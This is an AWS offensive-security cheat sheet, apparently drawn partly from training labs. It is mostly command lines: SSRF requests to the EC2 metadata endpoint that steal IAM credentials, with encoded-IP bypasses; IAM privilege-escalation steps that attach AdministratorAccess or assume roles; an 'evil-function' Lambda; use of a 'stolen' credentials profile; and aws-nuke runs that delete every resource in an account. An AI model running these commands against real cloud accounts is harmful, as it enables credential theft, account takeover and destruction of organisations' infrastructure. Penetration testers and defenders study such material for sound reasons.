# Cheat Sheet

## Auth methods:

```
• Programmatic access - Access + Secret Key
◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
• Management Console Access
◇ Web Portal Access to AWS
```

## Recon:

```
• AWS Usage
◇ Some web applications may pull content directly from S3 buckets
◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
◇ Burp Suite
◇ Navigate application like you normally would and then check for any requests to:
▪ https://[bucketname].s3.amazonaws.com
▪ https://s3-[region].amazonaws.com/[OrgName]
• Amazon Simple Storage Service (S3)
◇ Storage service that is “secure by default”
◇ Configuration issues tend to unsecure buckets by making them publicly accessible
◇ Nslookup can help reveal region
◇ S3 URL Format:
▪ https://[bucketname].s3.amazonaws.com
▪ https://s3-[region].amazonaws.com/[Org Name]
aws s3 ls s3://bucket-name-here --region
aws s3api get-bucket-acl --bucket bucket-name-here
aws s3 cp readme.txt s3://bucket-name-here --profile newuserprofile
```

### EBS Volumes:

```
• AWS virtual hard disks
• Elastic Block Store (EBS)
• Can have similar issues to S3 being publicly available
• Difficult to target specific org but can find widespread leaks
```

### EC2:

```
• Like virtual machines
• SSH keys created when started, RDP for Windows.
• Security groups to handle open ports and allowed IPs.
AWS Instance Metadata URL
• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
• Can contain access/secret keys to AWS and IAM credentials
• This should only be reachable from the localhost
• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
• IAM credentials can be stored here:
◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
• CapitalOne Hack
◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
• Updated in November 2019 – Both v1 and v2 are available
• Supposed to defend the metadata service against SSRF and reverse proxy vulns
• Added session auth to requests
• First, a “PUT” request is sent and then responded to with a token
• Then, that token can be used to query data
TOKEN=curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role


aws ec2 describe-images --owners amazon --filters
'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output
json
aws ec2 describe-subnets
aws ec2 describe-security-groups
aws iam list-instance-profiles
aws ec2 run-instances --subnet-id subnet-0b57901260df6b3f3 --image-id
ami-0d08a21fc010da680 --iam-instance-profile Name=ec2_admin --instance-type t2.micro
--security-group-ids "sg-06407fe95d211b245"
aws ssm send-command \
--document-name "AWS-RunShellScript" \
--parameters 'commands=["curl
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
--targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
--comment "aws cli 1"
aws ssm get-command-invocation \
--command-id "0765bff4-4966-446f-a0a2-4e0cdfee565f" \
--instance-id "i-0da83d9b4322af3fa"



aws cloudformation create-stack --stack-name ad-stack --template-body
file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn
arn:aws:iam::161176965264:role/lab12CFDeployRole
aws cloudformation describe-stacks --stack-name ad-stack
aws cloudformation describe-stack-events --stack-name ad-stack



aws lambda create-function \
--function-name evil-function \
--runtime python3.8 \
--zip-file fileb://evil-function.zip \
--handler evil.handler \
--role arn:aws:iam::645723898191:role/lab11lambdaiam
aws lambda invoke --function-name evil-function invoke_out.txt

aws iam create-login-profile --user-name AdminBob --password abcd@12345
--no-password-reset-required
```

## Post-compromise

```
What do our access keys give us access to?
• Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS nuke - remove all AWS services of our account
https://github.com/rebuy-de/aws-nuke
Fill nuke-config.yml with the output of aws sts get-caller-identity
./aws-nuke -c nuke-config.yml # Checks what will be removed
If fails because there is no alias created
aws iam create-account-alias --account-alias unique-name
./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation
Cloud Nuke
https://github.com/gruntwork-io/cloud-nuke
cloud-nuke aws
```

### Other bypasses

```
aws eks list-clusters | jq -rc '.clusters'
["example"]
aws eks update-kubeconfig --name example
kubectl get secrets
SSRF AWS Bypasses to access metadata endpoint.
Converted Decimal IP: http://2852039166/latest/meta-data/
IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```

### Interesting metadata instance urls:

```
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```

## Find Aws Domain

```
# Find subdomains

./sub.sh -s example.com
assetfinder example.com
## Bruteforcing
python3 dnsrecon.py -d example.com -D subdomains-top1mil-5000.txt -t brt

# Reverse DNS lookups
host subdomain.domain.com
host IP

# Bucket finders
python3 cloud_enum.py -k example.com
ruby lazys3.rb companyname
# https://github.com/bbb31/slurp
slurp domain -t example.com
```

## AIO AWS tools

### WeirdALL

```
# https://github.com/carnal0wnage/weirdAAL
pip3 install -r requirements
cp env.sample .env
vim .env
python3 weirdAAL.py -l
```

### Pacu

```
# https://github.com/RhinoSecurityLabs/pacu
bash install.sh
python3 pacu.py
import_keys --all
ls

run iam__enum_roles --role-name a4 --account-id 276384657722 --word-list
/home/student/names.txt
```

### Others

```
# https://github.com/dagrz/aws_pwn
# Lot of scripts for different purposes, check github
```

```
# Red team scripts for AWS
# https://github.com/elitest/Redboto
```

```
 AWS Exploitation Framework
# https://github.com/grines/scour
```

```
aws iam create-user --user-name Bob
aws iam attach-group-polcy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::607486832336:role/Attacher
--role-session-name attacher_test
aws iam list-role-policies --role-name Attacher
aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy
aws iam list-groups-for-user --user-name student
aws iam add-user-to-group --group-name Printers --user-name student
aws sts assume-role --role-arn arn:aws:iam::596317060068:role/Adder
--role-session-name adder_test
aws iam list-role-policies --role-name Adder
aws iam get-role-policy --role-name Adder --policy-name AddUser
aws iam list-user-policies --user-name student
aws iam get-user-policy --user-name student --policy-name
terraform-20210211051758659400000002
aws iam list-attached-user-policies --user-name student
aws iam attach-user-policy --user-name student --policy-arn
arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-policies | grep ‘AdministratorAccess’
aws iam get-policy-version --policy-arn arn:aws:iam::607486832336:policy/Service
--version-id v1
aws iam get-policy --policy-arn arn:aws:iam::607486832336:policy/Service
aws iam list-attached-policies --user-name student
aws iam get-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
--version-id v1
aws iam create-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
--policy-document file://newAdminPolicy.json --set-as-default
```

## IAM

## Prefix meaning

ABIA - AWS STS service bearer token&#x20;

ACCA - Context-specific credential&#x20;

AGPA - Group AIDA - IAM user&#x20;

AIPA - Amazon EC2 instance profile

&#x20;AKIA - Access key&#x20;

ANPA - Managed policy&#x20;

ANVA - Version in a managed policy

&#x20;APKA - Public key&#x20;

AROA - Role&#x20;

ASCA - Certificate&#x20;

ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.

### Credentials :

```
# ~/.aws/credentials
[default]
aws_access_key_id = XXX
aws_secret_access_key = XXXX

export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_DEFAULT_REGION=
```

### Check identity :&#x20;

```
aws sts get-caller-identity
aws sts get-access-key-info --access-key-id=ASIA1234567890123456
aws sdb list-domains --region us-east-1
# Open ~/.aws/credentials
# Under the [stolen] section add aws_session_token and add the discovered token value here
aws sts get-caller-identity --profile stolen
```

### Recon:

```
aws iam get-account-password-policy
aws sts get-session-token
aws iam list-users
aws iam list-roles
aws iam list-access-keys --user-name <username>
aws iam create-access-key --user-name <username>
aws iam list-attached-user-policies --user-name XXXX
aws iam get-policy
aws iam get-policy-version
aws deploy list-applications
aws directconnect describe-connections
aws secretsmanager get-secret-value --secret-id <value> --profile <container tokens>
aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa
```

### Get policies&#x20;

```
# Get policies available
aws --profile "$profile" iam list-policies | jq -r ".Policies[].Arn"
# Get specific policy version
aws --profile "$profile" iam get-policy --policy-arn "$i" --query "Policy.DefaultVersionId" --output text
# Get all juicy info oneliner (search for Action/Resource */*)
profile="test"; for i in $(aws --profile "$profile" iam list-policies | jq -r '.Policies[].Arn'); do echo "Describing policy $i" && aws --profile "$profile" iam get-policy-version --policy-arn "$i" --version-id $(aws --profile "$profile" iam get-policy --policy-arn "$i" --query 'Policy.DefaultVersionId' --output text); done | tee /tmp/policies.log 

#List Managed User policies
aws --profile "test" iam list-attached-user-policies --user-name "test-user"
#List Managed Group policies
aws --profile "test" iam list-attached-group-policies --group-name "test-group"
#List Managed Role policies
aws --profile "test" iam list-attached-role-policies --role-name "test-role"

#List Inline User policies
aws --profile "test" iam list-user-policies --user-name "test-user"
#List Inline Group policies
aws --profile "test" iam list-group-policies --group-name "test-group"
#List Inline Role policies
aws --profile "test" iam list-role-policies --role-name "test-role"


#Describe Inline User policies 
aws --profile "test" iam get-user-policy --user-name "test-user" --policy-name "test-policy"
#Describe Inline Group policies
aws --profile "test" iam get-group-policy --group-name "test-group" --policy-name "test-policy"
#Describe Inline Role policies
aws --profile "test" iam get-role-policy --role-name "test-role" --policy-name "test-policy"

# List roles policies
aws --profile "test" iam get-role --role-name "test-role" 

# Get service control policy
aws organizations list-policies-for-target --filter SERVICE_CONTROL_POLICY --target-id {}
```

### Assume role from any ec2 instance (get Admin)

```
Create role
aws iam create-role --role-name a4 --assume-role-policy-document
file://assume-role-doc.json


Create instance profile
aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
Associate role to Instance Profile
aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
Associate Instance Profile with instance you want to use
aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile
```

### Get token for specific role

```
aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
$ export AWS_SESSION_TOKEN=AQoDYXdzEJr...<remainder of session token>
$ aws ec2 describe-instances --region us-west-1
```

### Get assumed roles in instance

```
aws --profile test sts get-caller-identity
```

### Shadow admin

```
aws iam list-attached-user-policies --user-name {}
aws iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)
aws iam list-user-policies --user-name {}
aws iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool
```

### TOOLS

```
# https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key XXXXXXXXXXXXX --secret-key XXXXXXXXXXX
python enumerate-iam.py --access-key "ACCESSKEY" --secret-key "SECRETKEY" (--session-token "$AWS_SESSION_TOKEN")

# https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py
python aws_escalate.py

# https://github.com/andresriancho/nimbostratus
python2 nimbostratus dump-permissions

# https://github.com/nccgroup/ScoutSuite
python3 scout.py aws

# https://github.com/salesforce/cloudsplaining
cloudsplaining download
cloudsplaining scan

# Enumerate IAM permissions without logging (stealth mode)
# https://github.com/Frichetten/aws_stealth_perm_enum

# Unauthenticated (only account id) Enumeration of IAM Users and Roles 
# https://github.com/Frichetten/enumate_iam_using_bucket_policy

# AWS Consoler
# https://github.com/NetSPI/aws_consoler
# Generate link to console from valid credentials
aws_consoler -a ASIAXXXX -s SECRETXXXX -t TOKENXXXX

# AWSRoleJuggler
# https://github.com/hotnops/AWSRoleJuggler/
# You can use one assumed role to assume another one
./find_circular_trust.py 
python aws_role_juggler.py -r arn:aws:iam::123456789:role/BuildRole arn:aws:iam::123456789:role/GitRole arn:aws:iam::123456789:role/ArtiRole

# https://github.com/prisma-cloud/IAMFinder
python3 iamfinder.py init
python3 iamfinder.py enum_user --aws_id 123456789012

# https://github.com/nccgroup/PMapper
# Check IAM permissions
```



